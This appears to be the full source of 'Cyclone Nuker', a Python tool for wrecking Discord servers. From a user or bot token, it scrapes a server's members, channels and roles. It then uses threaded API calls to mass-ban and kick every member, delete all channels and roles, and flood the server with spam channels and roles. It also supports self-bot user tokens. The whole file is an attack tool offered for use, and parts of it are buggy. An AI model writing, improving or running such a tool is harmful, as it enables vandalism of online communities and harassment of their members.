import requests
import os
import sys
import threading
import time
import json
import asyncio
import discord
import aiohttp

from pypresence import Presence
from discord import Webhook, AsyncWebhookAdapter
from discord.ext import commands

os.system(f'cls & mode 69,69 & title [Cyclone Nuker] - Configuration')

token = input(f'\x1b[38;5;51m> \033[37mToken\x1b[38;5;51m- \033[37m')

os.system ('cls')

def check_token():
    if requests.get("https://discord.com/api/v8/users/@me", headers={"Authorization": f'{token}'}).status_code == 200:
        return "user"
    else:
        return "bot"

token_type = check_token()
intents = discord.Intents.all()
intents.members = True

if token_type == "user":
    headers = {'Authorization': f'{token}'}
    client = commands.Bot(command_prefix=".", case_insensitive=False, self_bot=True, intents=intents)
elif token_type == "bot":
    headers = {'Authorization': f'Bot {token}'}
    client = commands.Bot(command_prefix=".", case_insensitive=False, intents=intents)

client.remove_command("help")

class Cyclone:

    def __init__(self):
        self.colour = '\x1b[38;5;51m'

    def BanMembers(self, guild, member):
        while True:
            r = requests.put(f"https://discord.com/api/v8/guilds/{guild}/bans/{member}", headers=headers)
            if 'retry_after' in r.text:
                time.sleep(r.json()['retry_after'])
            else:
                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                    print(f"{self.colour}[\033[37m+{self.colour}]\033[37m Banned user with ID{self.colour} {member.strip()}\033[37m")
                    break
                else:
                    break

    def KickMembers(self, guild, member):
        while True:
            r = requests.delete(f"https://discord.com/api/v8/guilds/{guild}/members/{member}", headers=headers)
            if 'retry_after' in r.text:
                time.sleep(r.json()['retry_after'])
            else:
                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                    print(f"{self.colour}[\033[37m+{self.colour}]\033[37m Kicked user with ID{self.colour} {member.strip()}\033[37m")
                    break
                else:
                    break

    def DeleteChannels(self, guild, channel):
        while True:
            r = requests.delete(f"https://discord.com/api/v8/channels/{channel}", headers=headers)
            if 'retry_after' in r.text:
                time.sleep(r.json()['retry_after'])
            else:
                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                    print(f"{self.colour}[\033[37m+{self.colour}]\033[37m Deleted Channel with ID{self.colour}{channel.strip()}\033[37m")
                    break
                else:
                    break
          
    def DeleteRoles(self, guild, role):
        while True:
            r = requests.delete(f"https://discord.com/api/v8/guilds/{guild}/roles/{role}", headers=headers)
            if 'retry_after' in r.text:
                time.sleep(r.json()['retry_after'])
            else:
                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                    print(f"{self.colour}[\033[37m+{self.colour}]\033[37m Deleted Role with ID{self.colour} {role.strip()}\033[37m")
                    break
                else:
                    break

    def SpamChannels(self, guild, name):
        while True:
            json = {'name': name, 'type': 0}
            r = requests.post(f'https://discord.com/api/v8/guilds/{guild}/channels', headers=headers, json=json)
            if 'retry_after' in r.text:
                time.sleep(r.json()['retry_after'])
            else:
                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                    print(f"{self.colour}[\033[37m+{self.colour}]\033[37m Created Channel named{self.colour} {name}\033[37m")
                    break
                else:
                    break

    def SpamRoles(self, guild, name):
        while True:
            json = {'name': name}
            r = requests.post(f'https://discord.com/api/v8/guilds/{guild}/roles', headers=headers, json=json)
            if 'retry_after' in r.text:
                time.sleep(r.json()['retry_after'])
            else:
                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                    print(f"{self.colour}[\033[37m+{self.colour}]\033[37m Created Role named{self.colour} {name}\033[37m")
                    break
                else:
                    break

    async def Scrape(self):
        guild = input(f'{self.colour}> \033[37mServer ID{self.colour}- \033[37m')
        await client.wait_until_ready()
        guildOBJ = client.get_guild(int(guild))
        members = await guildOBJ.chunk()

        try:
            os.remove("Loaded/users.txt")
            os.remove("Loaded/channels.txt")
            os.remove("Loaded/roles.txt")
        except:
            pass

        membercount = 0
        with open('Loaded/users.txt', 'a') as m:
            for member in members:
                m.write(str(member.id) + "\n")
                membercount += 1
            print(f"\n{self.colour}[\033[37m!{self.colour}]\033[37m Loaded {self.colour}{membercount}\033[37m Users")
            m.close()

        channelcount = 0
        with open('Loaded/channels.txt', 'a') as c:
            for channel in guildOBJ.channels:
                c.write(str(channel.id) + "\n")
                channelcount += 1
            print(f"{self.colour}[\033[37m!{self.colour}]\033[37m Loaded {self.colour}{channelcount}\033[37m Channels")
            c.close()

        rolecount = 0
        with open('Loaded/roles.txt', 'a') as r:
            for role in guildOBJ.roles:
                r.write(str(role.id) + "\n")
                rolecount += 1
            print(f"{self.colour}[\033[37m!{self.colour}]\033[37m Loaded {self.colour}{rolecount}\033[37m Roles")
            r.close()

    async def Storm(self):
        guild = input(f'{self.colour}> \033[37mServer ID{self.colour}: \033[37m')
        channel_name = input(f"{self.colour}> \033[37mChannel Name{self.colour}: \033[37m")
        channel_amount = input(f"{self.colour}> \033[37mChannel Amount{self.colour}: \033[37m")
        role_name = input(f"{self.colour}> \033[37mRole Name{self.colour}: \033[37m")
        role_amount = input(f"{self.colour}> \033[37mRole Amount{self.colour}: \033[37m")
        print()

        members = open('Loaded/users.txt')
        channels = open('Loaded/channels.txt')
        roles = open('Loaded/roles.txt')

        for member in members:
            threading.Thread(target=self.BanMembers, args=(guild, member,)).start()
        for channel in channels:
            threading.Thread(target=self.DeleteChannels, args=(guild, channel,)).start()
        for role in roles:
            threading.Thread(target=self.DeleteRoles, args=(guild, role,)).start()
        for i in range(int(channel_amount)):
            threading.Thread(target=self.SpamChannels, args=(guild, channel_name,)).start()
        for i in range(int(role_amount)):
            threading.Thread(target=self.SpamRoles, args=(guild, role_name,)).start()
        members.close()
        channels.close()
        roles.close()

    async def BanExecute(self):
        guild = input(f'{self.colour}> \033[37mServer ID{self.colour}: \033[37m')
        print()
        members = open('Loaded/users.txt')
        for member in members:
            threading.Thread(target=self.BanMembers, args=(guild, member,)).start()
        members.close()

    async def KickExecute(self):
        guild = input(f'{self.colour}> \033[37mServer ID{self.colour}: \033[37m')
        print()
        members = open('Loaded/users.txt')
        for member in members:
            threading.Thread(target=self.KickMembers, args=(guild, member,)).start()
        members.close()

    async def ChannelDeleteExecute(self):
        guild = input(f'{self.colour}> \033[37mServer ID{self.colour}: \033[37m')
        print()
        channels = open('Loaded/channels.txt')
        for channel in channels:
            threading.Thread(target=self.DeleteChannels, args=(guild, channel,)).start()
        channels.close()

    async def RoleDeleteExecute(self):
        guild = input(f'{self.colour}> \033[37mServer ID{self.colour}: \033[37m')
        print()
        roles = open('Scraped/roles.txt')
        for role in roles:
            threading.Thread(target=self.DeleteRoles, args=(guild, role,)).start()
        roles.close()

    async def ChannelSpamExecute(self):
        guild = input(f'{self.colour}> \033[37mServer ID{self.colour}: \033[37m')
        name = input(f"{self.colour}> \033[37mChannel Name{self.colour}: \033[37m")
        amount = input(f"{self.colour}> \033[37mAmount{self.colour}: \033[37m")
        print()
        for i in range(int(amount)):
            threading.Thread(target=self.SpamChannels, args=(guild, name,)).start()

    async def RoleSpamExecute(self):
        guild = input(f'{self.colour}> \033[37mServer ID{self.colour}: \033[37m')
        name = input(f"{self.colour}> \033[37mRole Name{self.colour}: \033[37m")
        amount = input(f"{self.colour}> \033[37mAmount{self.colour}: \033[37m")
        print()
        for i in range(int(amount)):
            threading.Thread(target=self.SpamRoles, args=(guild, name,)).start()

    async def PruneMembers(self):
        guild = input(f'{self.colour}> \033[37mServer ID{self.colour}: \033[37m')
        print()
        await guild.prune_members(days=1, compute_prune_count=False, roles=guild.roles)

    async def Menu(self):
        os.system(f'cls & mode 85,20 & title [Cyclone Nuker] - Connected- {client.user}')
        print(f'''
                          {self.colour}╔═══╦╗──╔╦═══╦╗──╔═══╦═╗─╔╦═══╗
                          \033[90m║╔═╗║╚╗╔╝║╔═╗║║──║╔═╗║║╚╗║║╔══╝
                          \033[37m║║─╚╩╗╚╝╔╣║─╚╣║──║║─║║╔╗╚╝║╚══╗
                          \033[37m║║─╔╗╚╗╔╝║║─╔╣║─╔╣║─║║║╚╗║║╔══╝
                          \033[37m║╚═╝║─║║─║╚═╝║╚═╝║╚═╝║║─║║║╚══╗
                          \033[37m╚═══╝─╚╝─╚═══╩═══╩═══╩╝─╚═╩═══╝
                          
      {self.colour}╔═══════════════════════╦═══════════════════════╦═══════════════════════╗\033[37m
      {self.colour}║ \033[37m[{self.colour}1\033[37m] \033[37mBan Users       {self.colour}║\033[37m [{self.colour}4\033[37m] \033[37mDelete Roles      {self.colour}║\033[37m [{self.colour}7\033[37m] \033[37mCreate Roles        {self.colour}║\033[37m
      {self.colour}║ \033[37m[{self.colour}2\033[37m] \033[37mKick Users      {self.colour}║\033[37m [{self.colour}5\033[37m] \033[37mDelete Channels   {self.colour}║\033[37m [{self.colour}8\033[37m] \033[37mCreate Channels     {self.colour}║\033[37m
      {self.colour}║ \033[37m[{self.colour}3\033[37m] \033[37mPrune Users     {self.colour}║\033[37m [{self.colour}6\033[37m] \033[37mStorm             {self.colour}║\033[37m [{self.colour}9\033[37m] \033[37mScrape Server       {self.colour}║\033[37m
      {self.colour}╚═══════════════════════╩═══════════════════════╩═══════════════════════╝\033[37m
         
    ''')

        choice = input(f'{self.colour}> \033[37mChoice{self.colour}: \033[37m')
        if choice == '1':
            await self.BanExecute()
            time.sleep(2)
            await self.Menu()
        elif choice == '2':
            await self.KickExecute()
            time.sleep(2)
            await self.Menu()
        elif choice == '3':
            await PruneMembers()
            time.sleep(2)
            await self.Menu()
        elif choice == '4':
            await self.RoleDeleteExecute()
            time.sleep(2)
            await self.Menu()
        elif choice == '5':
            await self.ChannelDeleteExecute()
            time.sleep(2)
            await self.Menu()
        elif choice == '6':
            await self.Storm()
            time.sleep(2)
            await self.Menu()
        elif choice == '7':
            await self.RoleSpamExecute()
            time.sleep(2)
            await self.Menu()
        elif choice == '8':
            await self.ChannelSpamExecute()
            time.sleep(2)
            await self.Menu()
        elif choice == '9':
            await self.Scrape()
            time.sleep(3)
            await self.menu()

    @client.event
    async def on_ready():
        await Cyclone().Menu()
            
    def Startup(self):
        try:
            if token_type == "user":
                client.run(token, bot=False)
            elif token_type == "bot":
                client.run(token)
        except:
            print(f'{self.colour}> \033[37mInvalid Token Bruh')
            input()
            os._exit(0)

if __name__ == "__main__":
    Cyclone().Startup()
